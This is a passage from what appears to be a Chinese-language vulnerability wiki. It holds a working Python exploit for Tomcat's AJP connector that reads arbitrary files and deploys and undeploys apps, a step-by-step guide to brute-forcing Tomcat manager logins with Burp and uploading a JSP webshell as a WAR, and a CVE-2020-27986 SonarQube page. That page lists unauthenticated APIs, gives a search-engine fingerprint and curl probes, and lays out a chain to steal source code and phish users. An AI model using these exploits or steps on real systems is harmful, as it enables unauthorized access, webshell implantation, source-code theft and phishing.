return deploy_csrf_token[0], None def list_installed_applications(self, user, password, old_version, headers={}): deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers) headers = { \"SC_REQ_CONTENT_TYPE\": \"application/x-www-form-urlencoded\", \"SC_REQ_CONTENT_LENGTH\": \"0\", \"SC_REQ_REFERER\": \"http://%s/manager/html/\" % (self.target_host), \"Origin\": \"http://%s\" % (self.target_host), } if obj_cookie is not None: headers[\"SC_REQ_COOKIE\"] = obj_cookie.group('cookie') attributes = [{\"name\": \"req_attribute\", \"value\": (\"JK_LB_ACTIVATION\", \"ACT\")}, {\"name\": \"req_attribute\", \"value\": (\"AJP_REMOTE_PORT\", \"{}\".format(self.socket.getsockname()[1]))}] if old_version == False: attributes.append({ \"name\": \"query_string\", \"value\": \"%s\" % deploy_csrf_token}) hdrs, data = self.perform_request(\"/manager/html/\", headers=headers, method=\"GET\", user=user, password=password, attributes=attributes) found = [] for d in data: im = re.findall('/manager/html/expire\\?path=([^&]*)&', d.data) for app in im: found.append(unquote(app)) return found def undeploy(self, path, user, password, old_version, headers={}): deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers) path_app = \"path=%s\" % path headers = { \"SC_REQ_CONTENT_TYPE\": \"application/x-www-form-urlencoded\", \"SC_REQ_CONTENT_LENGTH\": \"0\", \"SC_REQ_REFERER\": \"http://%s/manager/html/\" % (self.target_host), \"Origin\": \"http://%s\" % (self.target_host), } if obj_cookie is not None: headers[\"SC_REQ_COOKIE\"] = obj_cookie.group('cookie') attributes = [{\"name\": \"req_attribute\", \"value\": (\"JK_LB_ACTIVATION\", \"ACT\")}, {\"name\": \"req_attribute\", \"value\": (\"AJP_REMOTE_PORT\", \"{}\".format(self.socket.getsockname()[1]))}] if old_version == False: attributes.append({ \"name\": \"query_string\", \"value\": \"%s&%s\" % (path_app, deploy_csrf_token)}) r = self.perform_request(\"/manager/html/undeploy\", headers=headers, method=\"POST\", user=user, password=password, attributes=attributes) r = AjpResponse.receive(self.stream) if r.prefix_code == AjpResponse.END_RESPONSE: logger.error('Undeploy failed') # Check the successful message found = False regex = r'Message:&nbsp;\\s*(OK - .*' + path + ')\\s*' while r.prefix_code != AjpResponse.END_RESPONSE: r = AjpResponse.receive(self.stream) if r.prefix_code == 3: f = re.findall(regex, r.data) if len(f) > 0: found = True if found: logger.info('Undeploy succeed') else: logger.error('Undeploy failed') if __name__ == \"__main__\": parser = argparse.ArgumentParser() parser.add_argument('target', type=str, help=\"Hostname or IP to attack\") parser.add_argument('-p', '--port', type=int, default=8009, help=\"AJP port to attack (default is 8009)\") parser.add_argument(\"-f\", '--file', type=str, default='WEB-INF/web.xml', help=\"file path :(WEB-INF/web.xml)\") args = parser.parse_args() bf = Tomcat(args.target, args.port) attributes = [ {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']}, {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', args.file]}, {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']}, ] snd_hdrs_res, data_res = bf.perform_request(req_uri='/',method='GET', attributes=attributes) print(\"\".join([d.data for d in data_res])) exp.py #!/usr/bin/python3 # Author: 00theway import socket import binascii import argparse import urllib.parse debug = False def log(type, *args, **kwargs): if type == 'debug' and debug == False: return elif type == 'append' and debug == True: return elif type == 'append': kwargs['end'] = '' print(*args, **kwargs) return print('[%s]' % type.upper(), *args, **kwargs) class ajpRequest(object): def __init__(self, request_url, method='GET', headers=[], attributes=[]): self.request_url = request_url self.method = method self.headers = headers self.attributes = attributes def method2code(self, method): methods = { 'OPTIONS': 1, 'GET': 2, 'HEAD': 3, 'POST': 4, 'PUT': 5, 'DELETE': 6, 'TRACE': 7, 'PROPFIND': 8 } code = methods.get(method, 2) return code def make_headers(self): header2code = { b'accept': b'\\xA0\\x01', # SC_REQ_ACCEPT b'accept-charset': b'\\xA0\\x02', # SC_REQ_ACCEPT_CHARSET b'accept-encoding': b'\\xA0\\x03', # SC_REQ_ACCEPT_ENCODING b'accept-language': b'\\xA0\\x04', # SC_REQ_ACCEPT_LANGUAGE b'authorization': b'\\xA0\\x05', # SC_REQ_AUTHORIZATION b'connection': b'\\xA0\\x06', # SC_REQ_CONNECTION b'content-type': b'\\xA0\\x07', # SC_REQ_CONTENT_TYPE b'content-length': b'\\xA0\\x08', # SC_REQ_CONTENT_LENGTH b'cookie': b'\\xA0\\x09', # SC_REQ_COOKIE b'cookie2': b'\\xA0\\x0A', # SC_REQ_COOKIE2 b'host': b'\\xA0\\x0B', # SC_REQ_HOST b'pragma': b'\\xA0\\x0C', # SC_REQ_PRAGMA b'referer': b'\\xA0\\x0D', # SC_REQ_REFERER b'user-agent': b'\\xA0\\x0E' # SC_REQ_USER_AGENT } headers_ajp = [] for (header_name, header_value) in self.headers: code = header2code.get(header_name, b'') if code != b'': headers_ajp.append(code) headers_ajp.append(self.ajp_string(header_value)) else: headers_ajp.append(self.ajp_string(header_name)) headers_ajp.append(self.ajp_string(header_value)) return self.int2byte(len(self.headers), 2), b''.join(headers_ajp) def make_attributes(self): ''' org.apache.catalina.jsp_file javax.servlet.include.servlet_path + javax.servlet.include.path_info ''' attribute2code = { b'remote_user': b'\\x03', b'auth_type': b'\\x04', b'query_string': b'\\x05', b'jvm_route': b'\\x06', b'ssl_cert': b'\\x07', b'ssl_cipher': b'\\x08', b'ssl_session': b'\\x09', b'req_attribute': b'\\x0A', # Name (the name of the attribut follows) b'ssl_key_size': b'\\x0B' } attributes_ajp = [] for (name, value) in self.attributes: code = attribute2code.get(name, b'') if code != b'': attributes_ajp.append(code) if code == b'\\x0A': for v in value: attributes_ajp.append(self.ajp_string(v)) else: attributes_ajp.append(self.ajp_string(value)) return b''.join(attributes_ajp) def ajp_string(self, message_bytes): # an AJP string # the length of the string on two bytes + string + plus two null bytes message_len_int = len(message_bytes) return self.int2byte(message_len_int, 2) + message_bytes + b'\\x00' def int2byte(self, data, byte_len=1): return data.to_bytes(byte_len, 'big') def make_forward_request_package(self): ''' AJP13_FORWARD_REQUEST := prefix_code (byte) 0x02 = JK_AJP13_FORWARD_REQUEST method (byte) protocol (string) req_uri (string) remote_addr (string) remote_host (string) server_name (string) server_port (integer) is_ssl (boolean) num_headers (integer) request_headers *(req_header_name req_header_value) attributes *(attribut_name attribute_value) request_terminator (byte) OxFF ''' req_ob = urllib.parse.urlparse(self.request_url) # JK_AJP13_FORWARD_REQUEST prefix_code_int = 2 prefix_code_bytes = self.int2byte(prefix_code_int) method_bytes = self.int2byte(self.method2code(self.method)) protocol_bytes = b'HTTP/1.1' req_uri_bytes = req_ob.path.encode('utf8') remote_addr_bytes = b'127.0.0.1' remote_host_bytes = b'localhost' server_name_bytes = req_ob.hostname.encode('utf8') # SSL flag if req_ob.scheme == 'https': is_ssl_boolean = 1 else: is_ssl_boolean = 0 # port server_port_int = req_ob.port if not server_port_int: server_port_int = (is_ssl_boolean ^ 1) * 80 + (is_ssl_boolean ^ 0) * 443 server_port_bytes = self.int2byte(server_port_int, 2) # convert to a two bytes is_ssl_bytes = self.int2byte(is_ssl_boolean) # convert to a one byte self.headers.append((b'host', b'%s:%d' % (server_name_bytes, server_port_int))) num_headers_bytes, headers_ajp_bytes = self.make_headers() attributes_ajp_bytes = self.make_attributes() message = [] message.append(prefix_code_bytes) message.append(method_bytes) message.append(self.ajp_string(protocol_bytes)) message.append(self.ajp_string(req_uri_bytes)) message.append(self.ajp_string(remote_addr_bytes)) message.append(self.ajp_string(remote_host_bytes)) message.append(self.ajp_string(server_name_bytes)) message.append(server_port_bytes) message.append(is_ssl_bytes) message.append(num_headers_bytes) message.append(headers_ajp_bytes) message.append(attributes_ajp_bytes) message.append(b'\\xff') message_bytes = b''.join(message) send_bytes = b'\\x12\\x34' + self.ajp_string(message_bytes) return send_bytes class ajpResponse(object): def __init__(self, s, out_file): self.sock = s self.out_file = out_file self.body_start = False self.common_response_headers = { b'\\x01': b'Content-Type', b'\\x02': b'Content-Language', b'\\x03': b'Content-Length', b'\\x04': b'Date', b'\\x05': b'Last-Modified', b'\\x06': b'Location', b'\\x07': b'Set-Cookie', b'\\x08': b'Set-Cookie2', b'\\x09': b'Servlet-Engine', b'\\x0a': b'Status', b'\\x0b': b'WWW-Authenticate', } if not self.out_file: self.out_file = False else: log('*', 'store response in %s' % self.out_file) self.out = open(self.out_file, 'wb') def parse_response(self): log('debug', 'start') magic = self.recv(2) # first two bytes are the 'magic' log('debug', 'magic', magic, binascii.b2a_hex(magic)) # next two bytes are the length data_len_int = self.read_int(2) code_int = self.read_int(1) log('debug', 'code', code_int) if code_int == 3: self.parse_send_body_chunk() elif code_int == 4: self.parse_headers() elif code_int == 5: self.parse_response_end() quit() self.parse_response() def parse_headers(self): log(\"append\", '\\n') log('debug', 'parsing RESPONSE HEADERS') status_int = self.read_int(2) msg_bytes = self.read_string() log(' 0x07 利用思路 首先探测目标管理页面，不同版本可能存在于不同目录，可以使用ffuf等工具 随后使用burp抓取认证包，他看起来像这样 GET /manager/html HTTP/1.1 Host: xxxxx User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Authorization: Basic §YWRtaW46MTIzNDU2§ //这里是认证字段，一般只是base64编码 发送到 Intruder 选择 Attack Type Sniper ，并对Authorization: Basic 后的内容设置 § 标识。 在Payloads 选项卡中的 Payload Type 标签中将其设置为 Custom iterator ； 如果目标数据包中有Cookie字段，需要删除或者随机fuzz，否则401 在 Payload Options 子标签中，的Position处，选择 1、2、3 Payload内容卡，分别在1中填写用户名 , 2中填写 :符号 , 3中填写密码 在Payload Processing 子标签中，点击 add 选择 Encode 和 Base64-encode ，最后将Payload Encoding 子标签的内容取消勾选，随后开始爆破 利用命令把 jsp webshell 转换为war包 jar -cvf \"shell.jsp\" 实战中直接zip打包改名也可以 在登入后台后，点击 List Applications 在 WAR file to deploy 选项卡中选择war 文件上传 利用webshell 管理工具连接，访问路径是 /war包名(不带.war)/XXX.jsp 图文链接: https[:]//github.com/fofapro/vulfocus/blob/master/writeup/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4.md 0x08 扩展链接 Tomcat 弱口令 Getshell by Frivolous-scholar 0x9 联系方式 作者 : BitWiki支持团队 "},"漏洞文库/SonarQube/":{"url":"漏洞文库/SonarQube/","title":"SonarQube","keywords":"","body":"SonarQube（原Sonar）[3]是SonarSource开发的一个开源平台，用于持续检查代码质量，通过静态分析代码执行自动审查，以检测20 多种编程语言上的错误、代码异味和安全漏洞。SonarQube 提供关于重复代码、编码标准、单元测试、代码覆盖率、代码复杂性、注释)、错误的报告。, 和安全漏洞。 "},"漏洞文库/SonarQube/CVE-2020-27986 SonarQube 小于 8.4.2.x 存在API未授权访问漏洞.html":{"url":"漏洞文库/SonarQube/CVE-2020-27986 SonarQube 小于 8.4.2.x 存在API未授权访问漏洞.html","title":"CVE 2020 27986 SonarQube 小于 8.4.2.X 存在API未授权访问漏洞","keywords":"","body":"CVE-2020-27986 | SonarQube 0x00 漏洞说明 在SonarQube 0x01 影响版本 SonarQube 0x02 漏洞成因 由于平台管理者未对默认的权限配置文件进行修改，导致API对外开放访问，且未对API使用进行有效的身份认证，导致执行高危操作，最终泄露平台托管的全部源代码、用户等敏感信息 0x03 详细分析 经过测试，以下API列表均可以在默认配置的情况下进行访问 #共57条 /api/ce/component /api/ce/task /api/ce/task_types /api/components/app /api/components/search /api/components/search_projects /api/components/suggestions /api/components/tree /api/duplications/show /api/emails/send /api/issues/changelog /api/issues/search /api/measures/component /api/measures/component_tree /api/measures/search /api/measures/search_history /api/metrics/search /api/metrics/search /api/metrics/types /api/navigation/component /api/navigation/global /api/navigation/settings /api/organizations/search /api/organizations/search_members /api/project_badges/measure /api/project_badges/quality_gate /api/project_branches/list /api/project_tags/search /api/project_tags/search /api/qualitygates/list /api/qualitygates/show?id=1 /api/qualityprofiles/importers /api/qualityprofiles/inheritance /api/qualityprofiles/search /api/qualityprofiles/show /api/rules/list /api/rules/repositories /api/rules/search /api/rules/show /api/rules/tags /api/rules/update /api/server/version /api/settings/list_definitions /api/settings/values /api/sources/index /api/sources/raw /api/sources/show /api/system/db_migration_status /api/system/migrate_db /api/system/status /api/system/upgrades /api/users/current /api/users/identity_providers /api/users/search /api/webservices/list /api/webservices/response_example /batch/project 其中有几个值得注意的API接口: PATH Description Response Contents Request Parameters 1 Request Parameters 2 Request Parameters 3 Availability after fix /api/server/version 返回应用的版本号 应用版本号 √ /api/settings/values 列出一些设定的值 可能会返回一些敏感信息，但是几率不大 × /api/users/search 列出活跃的用户 泄露几乎所有的用户列表，可以用于密码爆破 × /api/webservices/list 列出网络服务 返回一些api目录和api的详细信息 × /api/components/search_projects 搜索项目 返回敏感信息：organization、Project(ID)、Project(Key)等 × /api/components/tree 根据所选策略浏览组件 返回大量敏感信息：File(Key)、Project(Key)、Project(ID)等 component：Project(Key) componentId：Project(ID) × /api/emails/send 通过发送电子邮件测试电子邮件配置 需要先进行认证，但是认证成功后可以利用配置的邮箱进行钓鱼等横向操作 message：邮件内容 subject：邮件标题 to：目标邮箱 × /api/issues/search 阅读和更新Issues 返回敏感大量信息：issues(key)、File Key(Key)、project(Key)、author(Email)、与其他issues内容信息 × /api/issues/changelog 显示Issues的变更日志 如果有Issues的变更记录则返回 issue：Issue(key) × /api/measures/component_tree 获取具有指定度量的组件或子项 返回大量敏感信息：Project(ID)、File(Key)文件名等 metricKeys：ncloc,complexity,violations component：Project(Key) baseComponentId：Project(ID) × /api/navigation/component 获取有关当前用户的组件导航的信息。 返回少量敏感信息：project(Key)、organization、Project(ID)等 component：Project(Key) × /api/rules/list 列出规则，不包括手动规则和状态为 REMOVED 的规则 返回相关API规则信息 × /api/settings/list_definitions 列出API的设置定义 返回相关API定义内容 × /batch/project 返回项目存储库 返回指定项目中所有的存储库和文件目录以及其他敏感信息 key：Project(Key) × /api/sources/raw 以原始文本形式获取源代码 以原始文本形式获取指定文件的源代码(重点) key:File(Key) × /api/sources/index 获取源代码 获取指定文件的源代码(重点) key:File(Key) × /api/sources/show 以行号/文本对的形式获取源代码 以行号/文本对的形式获取指定文件的源代码(重点) key:File(Key) × 以下是一些参数的对应内容: API 上表对应值 API返回键 注释 /api/components/search_projects organization organization 所属组织名称 /api/components/search_projects Project(ID) id 项目的唯一标识ID，并非至单一项目，项目中的每个目录、每个文件都拥有一个 /api/components/search_projects Project(Key) key 这里的key一般与name单独计算，name是一些项目名称，key则还有可能是文件目录 /api/components/search_projects File(Key) key 后期参数需要的key，其格式为:: /api/components/tree File(Key) component 后期参数需要的key，其格式为:: /api/components/tree Project(Key) project 这里的key一般与name单独计算，name是一些项目名称，key则还有可能是文件目录 /api/components/tree Project(ID) key 项目的唯一标识ID，并非至单一项目，项目中的每个目录、每个文件都拥有一个 /api/issues/search issues(key) key 标识每个issues，每个回复每个问题都有一个 /api/issues/search File (Key) component 后期参数需要的key，其格式为:: /api/issues/search Project(Key) project 这里的key一般与name单独计算，name是一些项目名称，key则还有可能是文件目录 /api/issues/search author(Email) author 发起此issues的用户邮箱，可用于钓鱼 /api/measures/component_tree Project(ID) id 项目的唯一标识ID，并非至单一项目，项目中的每个目录、每个文件都拥有一个 /api/measures/component_tree File(Key) key 后期参数需要的key，其格式为::，但是该API存在项目名(根目录) /api/navigation/component project(Key) key 项目的唯一标识ID，并非至单一项目，项目中的每个目录、每个文件都拥有一个 /api/navigation/component organization organization 所属组织名称 /api/navigation/component Project(ID) id 项目的唯一标识ID，并非至单一项目，项目中的每个目录、每个文件都拥有一个 0x05 漏洞指纹 fofa: app=\"sonarQube-代码管理\" 0x04 POC & EXP POC crul http://example.com/api/server/version EXP crul http://example.com/api/settings/values 0x05 进阶利用思路 一、验证漏洞 通过 /api/server/version 和 /api/settings/values 判断目标系统版本号与是否存在漏洞 二、弱口令 通过 /api/users/search 获取用户列表，对用户密码进行模糊测试 三、源代码泄露 通过 /api/components/search_projects 获取 organization 、Project(ID) 和 Project(Key) 等后续需要的信息 通过 /api/components/tree 或 /batch/project 并代入之前获取的 Project(ID) 和 Project(Key) 参数，获取 File(Key) ，也就是:和其他后续需要的信息 通过 /api/sources/raw 、 /api/sources/index 或 /api/sources/show 并带入之前获取的 File(Key) 参数，获取目标文件的源代码 四、可能存在的横向移动 通过 /api/issues/search 获取人员联络方式(邮件) 获取权限后通过 /api/emails/send 对其人员进行钓鱼攻击 0x06 扩展链接 Atw组织攻击分析及cve 2020 27986进阶利用 【安全事件】黑客利用开源代码平台SonarQube漏洞泄露多家单位源码 CVE-2020-27986 0x7 联系方式 作者 : 08174 "}}